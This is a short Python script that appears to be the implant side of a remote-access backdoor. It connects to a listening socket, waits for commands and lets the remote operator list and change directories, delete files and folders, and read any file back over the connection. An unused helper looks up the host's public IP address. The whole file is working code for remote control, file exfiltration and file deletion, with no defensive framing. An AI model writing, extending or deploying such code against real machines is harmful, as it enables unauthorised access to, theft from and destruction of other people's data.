import socket
import os
import urllib.request


def pwd():
    return os.getcwd()


def ls():
    return os.listdir()


def cd(new_directory):
    os.chdir(new_directory)


def shred(item_path):
    if os.path.isdir(item_path):
        os.rmdir(item_path)
    else:
        os.remove(item_path)


def send(connection_socket, file_path):
    with open(file_path, 'rb') as file:
        data = file.read()
        connection_socket.sendall(data)

def publish():
    """Get IP address to create connection."""
    r = urllib.request.urlopen('https://api.ipify.org')
    ip_address = r.read().decode()


def main():
    conn = socket.socket()
    conn.connect(('127.0.0.1', 9999))

    while True:
        cmd = conn.recv(4096).decode()

        if 'pwd' in cmd.lower():
            conn.sendall(pwd().encode())
            continue

        elif 'ls' in cmd.lower():
            for item in ls():
                conn.sendall(f"{item}\n".encode())
            continue

        elif 'cd' in cmd.lower():
            split_command = cmd.split()
            cd(split_command[1])
            continue

        elif 'shred' in cmd.lower():
            split_command = cmd.split()
            item = split_command[1]
            if os.path.isdir(item):
                os.rmdir(item)
            else:
                os.remove(item)
            continue

        elif 'send' in cmd.lower():
            split_command = cmd.split()
            send(conn, split_command[1])
            continue
    
        
main()